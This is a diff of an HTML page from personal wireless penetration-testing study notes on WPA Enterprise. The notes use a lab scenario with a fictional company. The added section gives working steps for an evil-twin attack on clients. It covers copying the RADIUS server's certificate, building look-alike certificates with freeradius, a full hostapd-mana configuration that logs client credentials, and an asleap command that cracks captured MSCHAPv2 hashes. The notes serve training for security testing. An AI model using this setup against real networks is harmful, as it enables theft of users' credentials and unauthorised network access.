@@ -88,7 +88,7 @@
 
         <nav id="sidebar" class="sidebar" aria-label="Table of contents">
             <div class="sidebar-scrollbox">
-                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li class="chapter-item expanded "><a href="WPAEnterprise.html" class="active"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">12.</strong> Chapter 10 - Links</a></li></ol>
+                <ol class="chapter"><li class="chapter-item expanded "><a href="Introduction.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="Roadmap.html"><strong aria-hidden="true">2.</strong> Chapter 0 - Roadmap</a></li><li class="chapter-item expanded "><a href="chapter_1.html"><strong aria-hidden="true">3.</strong> Chapter 1 - Connect</a></li><li class="chapter-item expanded "><a href="Aircrack.html"><strong aria-hidden="true">4.</strong> Chapter 2 - Aircrack</a></li><li class="chapter-item expanded "><a href="Protocol.html"><strong aria-hidden="true">5.</strong> Chapter 3 - Protocol</a></li><li class="chapter-item expanded "><a href="Cracking.html"><strong aria-hidden="true">6.</strong> Chapter 4 - Cracking</a></li><li class="chapter-item expanded "><a href="WEP.html"><strong aria-hidden="true">7.</strong> Chapter 5 - WEP</a></li><li class="chapter-item expanded "><a href="WPA.html"><strong aria-hidden="true">8.</strong> Chapter 6 - WPA</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="CaptivePortal.html"><strong aria-hidden="true">8.1.</strong> Captive Portals</a></li></ol></li><li class="chapter-item expanded "><a href="WPAEnterprise.html" class="active"><strong aria-hidden="true">9.</strong> Chapter 7 - WPA Enterprise</a></li><li class="chapter-item expanded "><a href="RogueAP.html"><strong aria-hidden="true">10.</strong> Chapter 8 - Rogue AP</a></li><li class="chapter-item expanded "><a href="Wireshark.html"><strong aria-hidden="true">11.</strong> Chapter 9 - Wireshark</a></li><li class="chapter-item expanded "><a href="bettercap.html"><strong aria-hidden="true">12.</strong> Chapter 10 - bettercap</a></li><li class="chapter-item expanded "><a href="kismet.html"><strong aria-hidden="true">13.</strong> Chapter 11 - Kismet</a></li><li class="chapter-item expanded "><a href="Links.html"><strong aria-hidden="true">14.</strong> Chapter 12 - Links</a></li></ol>
             </div>
             <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                 <div class="sidebar-resize-indicator"></div>
@@ -174,6 +174,147 @@
                 <div id="content" class="content">
                     <main>
                         <h1 id="chapter-7---wpa-enterprise"><a class="header" href="#chapter-7---wpa-enterprise">Chapter 7 - WPA Enterprise</a></h1>
+<h2 id="my-notes"><a class="header" href="#my-notes">My Notes</a></h2>
+<h2 id="certificates"><a class="header" href="#certificates">Certificates</a></h2>
+<pre><code>sudo airodump-ng wlan0mon
+
+We have to open the capture file with _Wireshark_ and locate the server certificate frame.  
+
+tls.handshake.certificate
+
+which will show the exact frames where the certificate is given.
+
+--------
+
+1) In the **Packet Details** pane 
+2) open _Extensible Authentication Protocol
+3) _Transport Layer Security_
+4) Open the **TLSv1 Record Layer: Handshake Protocol: Certificate** 
+5) Expand **Handshake Protocol: Certificate** item
+6) then **Certificates** (plural). 
+7) Inside **Certificates**, we see one or more entries named **Certificate**
+8) For each certificate, we right click and select _Export Packet Bytes_ to save the data into a file with a .der extension.
+9) openssl x509 -inform der -in CERTIFICATE_FILENAME -text 
+	1) where **CERTIFICATE_FILENAME** is the path to the certificate.
+10) We can convert it to PEM format using 
+	1) openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt
+
+
+
+</code></pre>
+<h2 id="attack"><a class="header" href="#attack">Attack</a></h2>
+<pre><code>
+sudo apt install freeradius
+
+sudo -s
+cd /etc/freeradius/3.0/certs
+nano ca.cnf
+
+...
+[certificate_authority]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = ca@playtronics.com
+commonName              = "Playtronics Certificate Authority"
+...
+
+nano server.cnf
+
+...
+[server]
+countryName             = US
+stateOrProvinceName     = CA
+localityName            = San Francisco
+organizationName        = Playtronics
+emailAddress            = admin@playtronics.com
+commonName              = "Playtronics"
+...
+
+rm dh
+make
+
+sudo hostapd-mana /etc/hostapd-mana/mana.conf
+
+...
+# SSID of the AP
+ssid=Playtronics
+
+# Network interface to use and driver type
+# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
+interface=wlan0
+driver=nl80211
+
+# Channel and mode
+# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
+channel=1
+# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
+hw_mode=g
+
+# Setting up hostapd as an EAP server
+ieee8021x=1
+eap_server=1
+
+# Key workaround for Win XP
+eapol_key_index_workaround=0
+
+# EAP user file we created earlier
+eap_user_file=/etc/hostapd-mana/mana.eap_user
+
+# Certificate paths created earlier
+ca_cert=/etc/freeradius/3.0/certs/ca.pem
+server_cert=/etc/freeradius/3.0/certs/server.pem
+private_key=/etc/freeradius/3.0/certs/server.key
+# The password is actually 'whatever'
+private_key_passwd=whatever
+dh_file=/etc/freeradius/3.0/certs/dh
+
+# Open authentication
+auth_algs=1
+# WPA/WPA2
+wpa=3
+# WPA Enterprise
+wpa_key_mgmt=WPA-EAP
+# Allow CCMP and TKIP
+# Note: iOS warns when network has TKIP (or WEP)
+wpa_pairwise=CCMP TKIP
+
+# Enable Mana WPE
+mana_wpe=1
+
+# Store credentials in that file
+mana_credout=/tmp/hostapd.credout
+
+# Send EAP success, so the client thinks it's connected
+mana_eapsuccess=1
+
+# EAP TLS MitM
+mana_eaptls=1
+
+...
+
+We'll now need to create the EAP user file referenced in the configuration file:
+
+/etc/hostapd-mana/mana.eap_user
+
+The file should contain the following:
+...
+
+*     PEAP,TTLS,TLS,FAST
+"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
+
+...
+
+</code></pre>
+<h2 id="crack-password"><a class="header" href="#crack-password">Crack Password</a></h2>
+<pre><code>asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst
+
+
+
+</code></pre>
+<hr />
+<h2 id="other-notes"><a class="header" href="#other-notes">Other Notes</a></h2>
 <h3 id="wpa-enterprise"><a class="header" href="#wpa-enterprise">WPA enterprise</a></h3>
 <p>Each user uses his own user and password (if client certificates are not used). Each user's traffic is encrypted with a different key. Connection in windows:</p>
 <p>Looks like a captive portal but it's safer. In WPA enterprise we attack the clients, not the AP nor the RADIUS</p>
@@ -201,7 +342,7 @@ TTLS is a wrapper around TLVs (type length values), which are RADIUS attributes<
 <p>Similarly to EAP-TTLS, Protected Extensible Authentication Protocol (PEAP) also creates a TLS tunnel before credentials are exchanged. Although different methods can be used within PEAP, MS-CHAPv2 is a commonly used inner method.</p>
 <p>PEAP and EAP-TLS mostly differ on how the data is exchanged inside the TLS tunnel.</p>
 <p>PEAP hashes are of the type netNTLMv1, that can be cracked with  -m 5500 in hashcat</p>
-<h3 id="attack"><a class="header" href="#attack">Attack</a></h3>
+<h3 id="attack-1"><a class="header" href="#attack-1">Attack</a></h3>
 <p>The attack against WPA Enterprise consists in setting up a fake Access Point that imitates the target Access Point, so that clients connect to ours and in the process we capture hashes of their passwords, that can be cracked.</p>
 <h3 id="optional-imitating-the-server-certificates"><a class="header" href="#optional-imitating-the-server-certificates">Optional: imitating the server certificates</a></h3>
 <p>While it usually is not necessary, we will create a certificate similar to the one from the RADIUS server that the AP serves to its clients.</p>
@@ -393,7 +534,7 @@ bssid_blacklist=&lt;hostapd-mana MAC&gt;
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="WPA.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="CaptivePortal.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
@@ -407,7 +548,7 @@ bssid_blacklist=&lt;hostapd-mana MAC&gt;
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="WPA.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="CaptivePortal.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
@@ -418,6 +559,22 @@ bssid_blacklist=&lt;hostapd-mana MAC&gt;
 
         </div>
 
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
 
 
 
